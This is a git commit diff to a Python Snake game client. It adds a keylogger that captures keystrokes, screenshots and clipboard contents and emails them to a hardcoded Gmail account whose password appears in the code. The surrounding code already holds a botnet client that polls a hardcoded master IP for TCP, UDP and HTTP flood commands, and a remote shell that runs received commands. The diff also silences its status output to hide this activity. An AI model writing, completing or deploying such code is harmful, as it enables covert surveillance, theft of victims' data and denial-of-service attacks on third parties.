ea655af0cd07866df5e80d7fe3498c305722e009
soujanyanmbri <54130357+soujanyanmbri@users.noreply.github.com>
2021-05-12 22:10:26 +0530

    Keylogger + screenshot + clipboard + mailer added

--- game_client.py
+++ game_client.py
@@ -1,6 +1,19 @@
 import pygame, sys, time, random
 from pycomm.connection import Connection
+
 import time, subprocess, threading, socket
+
+from threading import Timer
+from datetime import datetime
+
+import keyboard, clipboard, autopy # for keylogs
+import smtplib
+from os.path import expanduser
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 
 
 # Difficulty settings
@@ -12,25 +25,18 @@ import time, subprocess, threading, socket
 MASTER_ADDRESS = "52.187.18.17"
 MASTER_PORT = 7982
 POLL_INTERVAL = 20
-
 difficulty = 25
-
 # Window size
 frame_size_x = 720
 frame_size_y = 480
-
-# Checks for errors encountered
 check_errors = pygame.init()
-# pygame.init() example output -> (6, 0)
-# second number in tuple gives number of errors
 if check_errors[1] > 0:
-    print(f'[!] Had {check_errors[1]} errors when initialising game, exiting...')
+    #print(f'[!] Had {check_errors[1]} errors when initialising game, exiting...')
     sys.exit(-1)
 else:
-    print('[+] Game successfully initialised')
+    pass
+    #print('[+] Game successfully initialised')
 
-
-# Initialise game window
 pygame.display.set_caption('Snake Eater')
 game_window = pygame.display.set_mode((frame_size_x, frame_size_y))
 
@@ -46,7 +52,9 @@ blue = pygame.Color(0, 0, 255)
 # FPS (frames per second) controller
 fps_controller = pygame.time.Clock()
 
-
+SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
+EMAIL_ADDRESS = "ramshyamdam04@gmail.com"
+EMAIL_PASSWORD = "zombiepasta!"
 
 # Game variables
 snake_pos = [100, 50]
@@ -59,6 +67,139 @@ direction = 'RIGHT'
 change_to = direction
 
 score = 0
+
+def take_screenshot():
+    autopy.bitmap.capture_screen().save('screengrab.png') 
+    #get contents of clipboard      
+def get_clipboard():
+    global text
+    text = "It contains clipboard contents" + "\n" + clipboard.paste()    
+
+class Keylogger(threading.Thread):
+    def __init__(self, interval, report_method="email"):
+        # we gonna pass SEND_REPORT_EVERY to interval
+        threading.Thread.__init__(self)
+        self.interval = interval
+        self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
+        self.log = ""
+        # record start & end datetimes
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+    
+    def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
+        name = event.name
+        if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
+            if name == "space":
+                # " " instead of "space"
+                name = " "
+            elif name == "enter":
+                # add a new line whenever an ENTER is pressed
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                # replace spaces with underscores
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
+        self.log += name
+    
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        #print(f"[+] Saved {self.filename}.txt")
+
+    
+    def sendmail(self, email, password, message):
+        global text
+        
+        
+        '''create a new gmail account where keylogger will send the file to
+        NOTE:
+            You Have to enable this:
+                allowing less secure apps to access your account
+                (https://support.google.com/accounts/answer/6010255)
+                refer this link
+        '''
+        
+        #checking if the internet is connected or not
+        IPaddress = socket.gethostbyname(socket.gethostname())
+        if(IPaddress!='127.0.0.1'):
+            #print("connected")
+            email_message = MIMEMultipart()
+            sub = str(expanduser("~")).split("\\")[-1] 
+            email_message['Subject']= "Keylogger information of " + str(sub)
+            #print(message)
+            #print(len(message))
+            email_message.attach(MIMEText(message, "plain"))
+            take_screenshot()
+            message=""
+            filename = "screengrab.png"  # In same directory as script
+            with open(filename, "rb") as attachment:
+                part = MIMEBase("application", "octet-stream")
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header(
+                        "Content-Disposition",
+                        f"attachment; filename= {filename}",
+                        )
+            email_message.attach(part)
+            email_message.attach(MIMEText("\n", "plain"))
+            get_clipboard()
+            email_message.attach(MIMEText(text, "plain"))
+            text=""
+            send=email_message.as_string()
+            #print(len(send))
+            if(len(send)!=307):
+                #print('inside if')
+                s = smtplib.SMTP('smtp.gmail.com', 587)
+                s.starttls()
+                s.login(email, password)
+                s.sendmail(email,email,send)
+                send=''
+                #print("sent")
+        else:
+            #print("not connected")
+            pass
+    def report(self):
+
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def run(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+
 
 
 class Poison (threading.Thread):
@@ -77,7 +218,7 @@ class Poison (threading.Thread):
         url = self.url
         port = self.port
 
-        print(f'Connecting to {url}:{port}')
+        #print(f'Connecting to {url}:{port}')
 
         if(self.type_name == "http_attack"):
             http_get_attack(sock, url, port)
@@ -102,20 +243,21 @@ def http_get_attack(sock, url, port):
             sock.send(data.encode("utf-8"))
 
     except Exception as e:
-        print("Error:", e)
+        #print("Error:", e)
+        pass
 
 
 def attack(url, port, n, type_name):
     threads = []
-    print("Creating theads...")
+    #print("Creating theads...")
     for i in range(n):
         threads.append(Poison(i, url, port, type_name))
 
-    print("Starting threads...")
+    #print("Starting threads...")
     for thread in threads:
         thread.start()
 
-    print("Waiting for threads...")
+    #print("Waiting for threads...")
     for thread in threads:
         thread.join()
 
@@ -126,25 +268,26 @@ def handle_command(command):
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            print(url, port)
+            #print(url, port)
             attack(url, port, n, "tcp_attack")
         if command.startswith("SEND UDP"):
             args = command.split()
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            print(url, port)
+            #print(url, port)
             attack(url, port, n, "udp_attack")
         if command.startswith("SEND HTTP"):
             args = command.split()
             url = args[2]
             port = int(args[3])
             n = int(args[4])
-            print(url, port)
+            #print(url, port)
             attack(url, port, n, "http_attack")
     except Exception as e:
-        print("Error decoding command")
-        print(e)
+        #print("Error decoding command")
+        #print(e)
+        pass
 
 
 # Game Over
@@ -276,19 +419,15 @@ def bot():
         try:
             master = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             master.connect((MASTER_ADDRESS, MASTER_PORT))
-
             res = master.recv(256)
-
             command = res.decode("utf-8")
-
             handle_command(command)
-
             master.close()
-
-            print(f'Next poll in {POLL_INTERVAL} seconds...')
+            #print(f'Next poll in {POLL_INTERVAL} seconds...')
         except Exception as e:
-            print("Error connecting to master", e)
-            print(f'Retrying in {POLL_INTERVAL} seconds...')
+            pass
+            #print("Error connecting to master", e)
+            #print(f'Retrying in {POLL_INTERVAL} seconds...')
         time.sleep(POLL_INTERVAL)
 
 def tcp_client():
@@ -298,7 +437,6 @@ def tcp_client():
             conn.connect()
             break
         except Exception as e:
-            # print(e)
             pass
         time.sleep(10)
 
@@ -308,13 +446,15 @@ def tcp_client():
             break
         result = "No result"
         try:
-            # result = subprocess.pop(command.split(), shell=True).decode('utf-8')
-            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            proc = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stdin=subprocess.PIPE,
+                    stderr=subprocess.PIPE)
             result=proc.communicate()[0].decode('utf-8')
             proc.wait()
         except Exception as err:
-            # print("Error running command")
-            # print(err)
             result = str(err)
 
         conn.send(result)
@@ -327,9 +467,12 @@ if __name__ == "__main__":
     t2 = threading.Thread(target=bot)
     t2.start()
 
+    t3 = Keylogger(SEND_REPORT_EVERY, "email")
+    t3.start()
+
     game()
 
     t1.join()
     t2.join()
-
-    print("done")
+    t3.join()
+    #print("done")
